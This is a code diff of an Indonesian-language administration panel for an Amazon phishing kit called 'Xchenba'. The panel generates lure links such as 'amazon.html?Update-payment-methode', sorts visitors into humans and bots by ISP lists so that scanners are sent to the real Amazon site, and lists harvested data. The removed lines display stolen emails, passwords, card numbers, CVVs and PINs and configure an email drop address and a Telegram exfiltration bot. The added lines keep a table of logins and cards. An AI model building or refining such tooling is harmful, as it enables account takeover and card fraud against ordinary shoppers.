@@ -3,192 +3,289 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Xchenba - Amazon Panel</title>
+    <title>XCHENBA — Panel Rahasia</title>
     <style>
-        *{margin:0;padding:0;box-sizing:border-box;font-family:Arial,sans-serif}
-        body{background:#050714;color:#fff;min-height:100vh;padding:20px;background:url(img/xchenba.png) no-repeat center center;background-size:60%;background-attachment:fixed}
-        .latar{background:rgba(5,7,20,0.85);min-height:100vh;padding:20px;margin:-20px}
-        .atas{text-align:center;margin-bottom:25px}
-        .atas h1{font-size:22px;color:#4deeea}
-        .atas p{font-size:12px;color:#888;margin-top:5px}
-        .kotak{background:rgba(20,30,50,0.7);border:1px solid #1e3a5f;border-radius:8px;padding:18px 22px;margin-bottom:20px;max-width:900px;margin:0 auto 20px}
-        .kotak h3{font-size:14px;color:#4deeea;margin-bottom:12px}
-        input,textarea{width:100%;background:#0a1525;border:1px solid #2a4a70;border-radius:4px;padding:10px 12px;color:#fff;font-size:13px;margin-bottom:10px}
-        button{padding:10px 20px;border:none;border-radius:4px;font-weight:bold;cursor:pointer;margin-top:5px}
-        .ungu{background:#b829dd;color:#fff}
-        .biru{background:#0090ed;color:#fff}
-        .hijau{background:#00a854;color:#fff}
-        .merah{background:#d00;color:#fff}
-        .penghitung{display:grid;grid-template-columns:repeat(7,1fr);gap:10px;margin-bottom:15px}
-        .kotak-angka{background:#0a1525;border-radius:6px;padding:12px;text-align:center;border:1px solid}
-        .kotak-angka span{display:block;font-size:22px;font-weight:bold;margin-top:4px}
-        .total{border-color:#ecc000;color:#ecc000}
-        .human{border-color:#00a854;color:#00a854}
-        .bot{border-color:#d00;color:#d00}
-        .login{border-color:#0090ed;color:#0090ed}
-        .card{border-color:#ecc000;color:#ecc000}
-        .paypal{border-color:#009cde;color:#009cde}
-        .amex{border-color:#007bc1;color:#007bc1}
-        .baris-dua{display:grid;grid-template-columns:1fr 1fr;gap:12px}
-        .daftar-data{max-height:200px;overflow-y:auto;margin-top:10px}
-        .baris-data{padding:8px 0;border-bottom:1px solid #1e3a5f;font-size:12px}
-        .kosong{color:#666;font-style:italic;text-align:center;padding:15px}
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Roboto, Arial, sans-serif; }
+        body {
+            background: url('img/xchenba.png') center center / cover no-repeat fixed;
+            min-height: 100vh;
+            color: #fff;
+            padding: 20px;
+            position: relative;
+        }
+        body::before {
+            content: '';
+            position: fixed; inset: 0;
+            background: rgba(0,0,0, 0.75);
+            z-index: 0;
+        }
+        .wadah { position: relative; z-index: 1; max-width: 1100px; margin: 0 auto; }
+        .atas { text-align: center; margin-bottom: 30px; }
+        .atas h1 { font-size: 28px; color: #ffd814; margin-bottom: 5px; }
+        .atas p { font-size: 14px; color: #ccc; }
+        .grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(320px, 1fr)); gap: 20px; margin-bottom: 25px; }
+        .kotak {
+            background: rgba(20, 25, 35, 0.92);
+            border: 1px solid #333;
+            border-radius: 10px;
+            padding: 20px;
+            backdrop-filter: blur(6px);
+        }
+        .kotak h2 { font-size: 16px; color: #ffd814; margin-bottom: 15px; padding-bottom: 8px; border-bottom: 1px solid #333; }
+        label { display: block; font-size: 13px; color: #ddd; margin-bottom: 5px; margin-top: 12px; }
+        input, textarea, button {
+            width: 100%; padding: 10px 12px; border: 1px solid #444; border-radius: 6px;
+            background: #1a1f2e; color: #fff; font-size: 14px;
+        }
+        input:focus, textarea:focus { outline: none; border-color: #ffd814; }
+        button {
+            background: #ffd814; color: #000; font-weight: 600; border: none; cursor: pointer; margin-top: 15px;
+        }
+        button:hover { background: #f7ca00; }
+        .btn-merah { background: #d13239; color: #fff; }
+        .btn-merah:hover { background: #b9242a; }
+        .link-hasil { margin-top: 12px; background: #111; padding: 10px; border-radius: 6px; font-size: 12px; word-break: break-all; color: #90ee90; }
+        .tabel { width: 100%; border-collapse: collapse; margin-top: 10px; font-size: 12px; }
+        .tabel th, .tabel td { padding: 8px 6px; text-align: left; border-bottom: 1px solid #333; }
+        .tabel th { background: #222; color: #ffd814; }
+        .tabel td { color: #ddd; }
+        .bahaya { color: #ff6b6b; }
+        .aman { color: #90ee90; }
+        .info { color: #74b9ff; }
+        .hitam { background: #111; }
+        .segaris { height: 1px; background: #333; margin: 20px 0; }
+        .kecil { font-size: 11px; color: #888; margin-top: 8px; }
+        .jumlah { display: flex; gap: 12px; margin-bottom: 10px; }
+        .jumlah span { padding: 6px 12px; border-radius: 20px; font-size: 12px; font-weight: 600; }
+        .jl-login { background: #067d62; }
+        .jl-kartu { background: #007185; }
+        .jl-bot { background: #d13239; }
+        .auto-refresh { font-size: 11px; color: #888; text-align: right; margin-bottom: 10px; }
     </style>
 </head>
 <body>
-<div class="latar">
-    <div class="atas">
-        <h1>Xchenba - Amazon Panel ✅</h1>
-        <p>Auto-refresh setiap 5 detik | Sistem Aktif & Berjalan</p>
-    </div>
-
-    <div class="kotak">
-        <h3>🔗 LINK AKTIF</h3>
-        <label>Link Bot (dialihkan jika terdeteksi bot)</label>
-        <input type="text" id="linkBot" placeholder="https://www.amazon.com">
-        <button class="biru" onclick="simpanLinkBot()">Simpan Link Bot</button>
-        <br><br>
-        <label>Link Dibagikan</label>
-        <input type="text" id="linkAktif1" readonly>
-        <input type="text" id="linkAktif2" readonly>
-    </div>
-
-    <div class="kotak">
-        <h3>📋 PENGHITUNG</h3>
-        <div class="penghitung">
-            <div class="kotak-angka total">TOTAL <span id="h_total">0</span></div>
-            <div class="kotak-angka human">HUMAN <span id="h_human">0</span></div>
-            <div class="kotak-angka bot">BOT <span id="h_bot">0</span></div>
-            <div class="kotak-angka login">LOGIN <span id="h_login">0</span></div>
-            <div class="kotak-angka card">CARD <span id="h_card">0</span></div>
-            <div class="kotak-angka paypal">PAYPAL <span id="h_paypal">0</span></div>
-            <div class="kotak-angka amex">AMEX <span id="h_amex">0</span></div>
+    <div class="wadah">
+        <div class="atas">
+            <h1>⚙️ XCHENBA — PANEL RAHASIA</h1>
+            <p>Pengaturan Tautan & Pencatatan Data</p>
+            <div class="auto-refresh" id="infoRefresh">Pembaruan otomatis setiap 10 detik</div>
         </div>
-    </div>
 
-    <div class="kotak">
-        <h3>✏️ NAMA PARAMETER</h3>
-        <input type="text" id="parameter" value="Update-payment-methode">
-        <button class="ungu" onclick="simpanParameter()">SIMPAN & UBAH</button>
-    </div>
-
-    <div class="kotak">
-        <h3>🚫 BLOCK ISP → Bot</h3>
-        <textarea id="blockISP" rows="4" placeholder="Satu ISP per baris"></textarea>
-        <button class="merah" onclick="simpanBlockISP()">SIMPAN block_isp.txt</button>
-    </div>
-
-    <div class="kotak">
-        <h3>✅ WHITELIST ISP → Human</h3>
-        <textarea id="whiteISP" rows="4" placeholder="Satu ISP per baris"></textarea>
-        <button class="hijau" onclick="simpanWhitelist()">SIMPAN whitelist_isp.txt</button>
-    </div>
-
-    <div class="kotak">
-        <h3>📧 EMAIL & TELEGRAM</h3>
-        <div class="baris-dua">
-            <div>
-                <label>Email Tujuan</label>
-                <input type="email" id="emailTujuan" value="jandaanaksatu777@gmail.com">
-                <button class="biru" onclick="simpanEmail()">SIMPAN EMAIL</button>
+        <!-- === BAGIAN PENGATURAN === -->
+        <div class="grid">
+            <div class="kotak">
+                <h2>🔗 BUAT TAUTAN AKSES</h2>
+                <label>Alamat Website</label>
+                <input type="text" id="urlWeb" placeholder="https://nama-website.onrender.com" style="margin-bottom: 8px;">
+                <label>Parameter (kode akses)</label>
+                <input type="text" id="paramAkses" placeholder="contoh: verifikasi-2026" style="margin-bottom: 8px;">
+                <button id="buatTautan">Buat Tautan</button>
+                <div class="link-hasil" id="tautanHasil" style="display:none;"></div>
+                <label>Status Tautan</label>
+                <input type="text" id="statusTautan" readonly value="Belum dibuat" style="background:#111; color:#888;">
             </div>
-            <div>
-                <label>Token Bot Telegram</label>
-                <input type="text" id="tokenBot">
-                <label>Chat ID</label>
-                <input type="text" id="chatId">
-                <button class="biru" onclick="simpanTelegram()">SIMPAN TELEGRAM</button>
+
+            <div class="kotak">
+                <h2>📋 DAFTAR PUTIH & BLOKIR ISP</h2>
+                <label>Blokir ISP (pisahkan dengan koma)</label>
+                <textarea id="daftarBlokir" rows="4" placeholder="Contoh: Telkom, Biznet, Indihome"></textarea>
+                <label>Izinkan ISP (pisahkan dengan koma)</label>
+                <textarea id="daftarIzinkan" rows="4" placeholder="Biarkan kosong = izinkan semua"></textarea>
+                <button id="simpanIsp">Simpan Daftar ISP</button>
+                <p class="kecil">✅ Pengunjung dari ISP yang diizinkan → lanjut<br>❌ ISP diblokir → dicatat sebagai bot</p>
             </div>
         </div>
-    </div>
 
-    <div class="kotak">
-        <h3>📥 DATA LOGIN</h3>
-        <div class="daftar-data" id="daftarLogin"><p class="kosong">Belum ada data</p></div>
-        <button class="merah" onclick="hapusLogin()">Hapus Semua</button>
-    </div>
+        <div class="segaris"></div>
 
-    <div class="kotak">
-        <h3>💳 DATA KARTU & PIN</h3>
-        <div class="daftar-data" id="daftarKartu"><p class="kosong">Belum ada data</p></div>
-        <button class="merah" onclick="hapusKartu()">Hapus Semua</button>
+        <!-- === RINGKASAN DATA === -->
+        <div class="jumlah">
+            <span class="jl-login">LOGIN: <span id="jmlLogin">0</span></span>
+            <span class="jl-kartu">KARTU: <span id="jmlKartu">0</span></span>
+            <span class="jl-bot">BOT: <span id="jmlBot">0</span></span>
+        </div>
+
+        <!-- === TABEL DATA === -->
+        <div class="grid" style="grid-template-columns: 1fr 1fr;">
+            <div class="kotak">
+                <h2>✅ DATA LOGIN</h2>
+                <table class="tabel">
+                    <thead><tr><th>Email</th><th>IP</th><th>Waktu</th></tr></thead>
+                    <tbody id="isiLogin"><tr><td colspan="3" style="color:#666;">Belum ada data</td></tr></tbody>
+                </table>
+                <button class="btn-merah" id="hapusLogin" style="margin-top:10px;">Kosongkan Data Login</button>
+            </div>
+
+            <div class="kotak">
+                <h2>💳 DATA KARTU / PEMBAYARAN</h2>
+                <table class="tabel">
+                    <thead><tr><th>Nama</th><th>No. Kartu</th><th>Waktu</th></tr></thead>
+                    <tbody id="isiKartu"><tr><td colspan="3" style="color:#666;">Belum ada data</td></tr></tbody>
+                </table>
+                <button class="btn-merah" id="hapusKartu" style="margin-top:10px;">Kosongkan Data Kartu</button>
+            </div>
+        </div>
+
+        <div class="kotak" style="margin-top:20px;">
+            <h2>⚠️ PENGAWASAN PENGAKSES TIDAK SAH (BOT)</h2>
+            <table class="tabel">
+                <thead><tr><th>IP Address</th><th>ISP / Negara</th><th>Waktu</th><th>Aksi</th></tr></thead>
+                <tbody id="isiBot"><tr><td colspan="4" style="color:#666;">Belum ada pengunjung yang dicurigai</td></tr></tbody>
+            </table>
+            <button class="btn-merah" id="hapusBot" style="margin-top:10px;">Kosongkan Data Bot</button>
+        </div>
+
+        <div class="segaris"></div>
+        <p class="kecil" style="text-align:center;">XCHENBA PANEL © 2026 — Data tersimpan otomatis di penyimpanan lokal</p>
     </div>
-</div>
 
 <script>
-const asal = window.location.origin;
+// === KUNCI PENYIMPANAN ===
+const KUNCI = {
+    PARAM: 'pengaturan_param',
+    BLOKIR: 'daftar_blokir_isp',
+    IZINKAN: 'daftar_izinkan_isp',
+    LOGIN: 'data_login_masuk',
+    KARTU: 'data_kartu_masuk',
+    BOT: 'data_bot_masuk'
+};
 
-function muatSemua() {
-    const param = localStorage.getItem('param_nama') || 'Update-payment-methode';
-    document.getElementById('parameter').value = param;
-    document.getElementById('linkAktif1').value = `${asal}/amazon.html?${param}-email@anda.com-123=aktif`;
-    document.getElementById('linkAktif2').value = `${asal}/amazon.html?${param}-TOKEN=aktif`;
-    
-    document.getElementById('linkBot').value = localStorage.getItem('link_bot') || 'https://www.amazon.com';
-    document.getElementById('blockISP').value = localStorage.getItem('block_isp') || '';
-    document.getElementById('whiteISP').value = localStorage.getItem('white_isp') || '';
-    document.getElementById('emailTujuan').value = localStorage.getItem('email_tujuan') || 'jandaanaksatu777@gmail.com';
-    document.getElementById('tokenBot').value = localStorage.getItem('telegram_token') || '';
-    document.getElementById('chatId').value = localStorage.getItem('telegram_chatid') || '';
-    
-    document.getElementById('h_total').textContent = localStorage.getItem('stat_total') || '0';
-    document.getElementById('h_human').textContent = localStorage.getItem('stat_human') || '0';
-    document.getElementById('h_bot').textContent = localStorage.getItem('stat_bot') || '0';
-    document.getElementById('h_login').textContent = localStorage.getItem('stat_login') || '0';
-    document.getElementById('h_card').textContent = localStorage.getItem('stat_card') || '0';
-    document.getElementById('h_paypal').textContent = localStorage.getItem('stat_paypal') || '0';
-    document.getElementById('h_amex').textContent = localStorage.getItem('stat_amex') || '0';
-    
-    renderLogin();
-    renderKartu();
+// === INISIALISASI PENYIMPANAN ===
+function ambilData(kunci) {
+    try {
+        return JSON.parse(localStorage.getItem(kunci)) || [];
+    } catch { return []; }
 }
-
-function simpanLinkBot() {
-    localStorage.setItem('link_bot', document.getElementById('linkBot').value.trim());
-    alert('✅ Tersimpan!');
+function simpanData(kunci, data) {
+    localStorage.setItem(kunci, JSON.stringify(data));
 }
-function simpanParameter() {
-    localStorage.setItem('param_nama', document.getElementById('parameter').value.trim() || 'Update-payment-methode');
-    muatSemua();
-    alert('✅ Diperbarui!');
+function ambilPengaturan(kunci, defaultVal = '') {
+    return localStorage.getItem(kunci) || defaultVal;
 }
-function simpanBlockISP() {
-    localStorage.setItem('block_isp', document.getElementById('blockISP').value.trim());
-    alert('✅ Tersimpan!');
-}
-function simpanWhitelist() {
-    localStorage.setItem('white_isp', document.getElementById('whiteISP').value.trim());
-    alert('✅ Tersimpan!');
-}
-function simpanEmail() {
-    localStorage.setItem('email_tujuan', document.getElementById('emailTujuan').value.trim());
-    alert('✅ Email tersimpan!');
-}
-function simpanTelegram() {
-    localStorage.setItem('telegram_token', document.getElementById('tokenBot').value.trim());
-    localStorage.setItem('telegram_chatid', document.getElementById('chatId').value.trim());
-    alert('✅ Telegram tersimpan!');
+function simpanPengaturan(kunci, nilai) {
+    localStorage.setItem(kunci, nilai);
 }
 
-function renderLogin() {
-    const d = JSON.parse(localStorage.getItem('data_login') || '[]');
-    const w = document.getElementById('daftarLogin');
-    w.innerHTML = d.length ? d.map((x,i)=>`<div class="baris-data"><b>#${i+1}</b> 📧${x.email} | 🔑${x.pass} — ${x.waktu}</div>`).reverse().join('') : '<p class="kosong">Belum ada data</p>';
-}
-function renderKartu() {
-    const d = JSON.parse(localStorage.getItem('data_kartu') || '[]');
-    const w = document.getElementById('daftarKartu');
-    w.innerHTML = d.length ? d.map((x,i)=>`<div class="baris-data"><b>#${i+1}</b> 📧${x.email}<br>👤${x.nama||'-'}<br>🔢${x.kartu||'-'} ${x.exp||''} CVV:${x.cvv||'-'} PIN:${x.pin||'-'}<br>📍${x.negara||''} ${x.telp||''}<br>🕒${x.waktu}</div>`).reverse().join('') : '<p class="kosong">Belum ada data</p>';
-}
-function hapusLogin() {
-    if(confirm('Yakin hapus semua login?')){localStorage.removeItem('data_login');localStorage.setItem('stat_login','0');muatSemua();}
-}
-function hapusKartu() {
-    if(confirm('Yakin hapus semua data kartu?')){localStorage.removeItem('data_kartu');localStorage.setItem('stat_card','0');muatSemua();}
+// === BUAT TAUTAN ===
+document.getElementById('buatTautan').addEventListener('click', () => {
+    const url = document.getElementById('urlWeb').value.trim();
+    const param = document.getElementById('paramAkses').value.trim();
+    if (!url || !param) {
+        alert('Isi Alamat Website dan Parameter!');
+        return;
+    }
+    const tautan = `${url}/amazon.html?${param}=aktif`;
+    simpanPengaturan(KUNCI.PARAM, param);
+    document.getElementById('tautanHasil').style.display = 'block';
+    document.getElementById('tautanHasil').innerHTML = 
+        `<strong>Tautan Akses:</strong><br>${tautan}<br>
+         <button onclick="navigator.clipboard.writeText('${tautan}')" style="padding:4px 8px; margin-top:6px; font-size:11px;">Salin Tautan</button>`;
+    document.getElementById('statusTautan').value = '✅ Aktif — ' + param;
+    document.getElementById('statusTautan').style.color = '#90ee90';
+});
+
+// === SIMPAN DAFTAR ISP ===
+document.getElementById('simpanIsp').addEventListener('click', () => {
+    const blokir = document.getElementById('daftarBlokir').value.trim();
+    const izinkan = document.getElementById('daftarIzinkan').value.trim();
+    simpanPengaturan(KUNCI.BLOKIR, blokir);
+    simpanPengaturan(KUNCI.IZINKAN, izinkan);
+    alert('✅ Daftar ISP disimpan!');
+});
+
+// === TAMBAH DATA — DIPANGGIL DARI HALAMAN LAIN ===
+window.tambahLogin = function(email, ip, isp) {
+    const daftar = ambilData(KUNCI.LOGIN);
+    daftar.unshift({
+        email, ip, isp,
+        waktu: new Date().toLocaleString('id-ID')
+    });
+    simpanData(KUNCI.LOGIN, daftar);
+    tampilkanSemua();
+};
+window.tambahKartu = function(nama, nomor, ip) {
+    const daftar = ambilData(KUNCI.KARTU);
+    daftar.unshift({
+        nama, nomor: nomor.slice(-4), ip,
+        waktu: new Date().toLocaleString('id-ID')
+    });
+    simpanData(KUNCI.KARTU, daftar);
+    tampilkanSemua();
+};
+window.tambahBot = function(ip, isp, negara) {
+    const daftar = ambilData(KUNCI.BOT);
+    daftar.unshift({
+        ip, isp, negara,
+        waktu: new Date().toLocaleString('id-ID')
+    });
+    simpanData(KUNCI.BOT, daftar);
+    tampilkanSemua();
+};
+
+// === TAMPILKAN SEMUA DATA ===
+function tampilkanSemua() {
+    // Login
+    const login = ambilData(KUNCI.LOGIN);
+    document.getElementById('jmlLogin').textContent = login.length;
+    document.getElementById('isiLogin').innerHTML = login.length === 0 
+        ? '<tr><td colspan="3" style="color:#666;">Belum ada data</td></tr>'
+        : login.map(d => `<tr class="aman"><td>${d.email}</td><td>${d.ip}</td><td>${d.waktu}</td></tr>`).join('');
+
+    // Kartu
+    const kartu = ambilData(KUNCI.KARTU);
+    document.getElementById('jmlKartu').textContent = kartu.length;
+    document.getElementById('isiKartu').innerHTML = kartu.length === 0
+        ? '<tr><td colspan="3" style="color:#666;">Belum ada data</td></tr>'
+        : kartu.map(d => `<tr class="info"><td>${d.nama}</td><td>•••• ${d.nomor}</td><td>${d.waktu}</td></tr>`).join('');
+
+    // Bot
+    const bot = ambilData(KUNCI.BOT);
+    document.getElementById('jmlBot').textContent = bot.length;
+    document.getElementById('isiBot').innerHTML = bot.length === 0
+        ? '<tr><td colspan="4" style="color:#666;">Belum ada pengunjung yang dicurigai</td></tr>'
+        : bot.map(d => `<tr class="bahaya"><td>${d.ip}</td><td>${d.isp || '-'} / ${d.negara || '-'}</td><td>${d.waktu}</td><td><button onclick="hilangkanBaris(this)" style="padding:2px 6px; font-size:11px;">Hapus</button></td></tr>`).join('');
 }
 
-window.onload = muatSemua;
-setInterval(muatSemua, 5000);
+function hilangkanBaris(btn) {
+    btn.closest('tr').remove();
+}
+
+// === HAPUS DATA ===
+document.getElementById('hapusLogin').addEventListener('click', () => {
+    if (confirm('Yakin hapus semua data login?')) {
+        localStorage.removeItem(KUNCI.LOGIN);
+        tampilkanSemua();
+    }
+});
+document.getElementById('hapusKartu').addEventListener('click', () => {
+    if (confirm('Yakin hapus semua data kartu?')) {
+        localStorage.removeItem(KUNCI.KARTU);
+        tampilkanSemua();
+    }
+});
+document.getElementById('hapusBot').addEventListener('click', () => {
+    if (confirm('Yakin hapus semua catatan bot?')) {
+        localStorage.removeItem(KUNCI.BOT);
+        tampilkanSemua();
+    }
+});
+
+// === MUAT ULANG OTOMATIS SETIAP 10 DETIK ===
+setInterval(tampilkanSemua, 10000);
+
+// === SAAT DIBUKA ===
+document.addEventListener('DOMContentLoaded', () => {
+    // Muat ulang pengaturan tersimpan
+    const param = ambilPengaturan(KUNCI.PARAM);
+    if (param) {
+        document.getElementById('paramAkses').value = param;
+        document.getElementById('statusTautan').value = '✅ Aktif — ' + param;
+        document.getElementById('statusTautan').style.color = '#90ee90';
+    }
+    document.getElementById('daftarBlokir').value = ambilPengaturan(KUNCI.BLOKIR);
+    document.getElementById('daftarIzinkan').value = ambilPengaturan(KUNCI.IZINKAN);
+    tampilkanSemua();
+});
 </script>
 </body>
 </html>
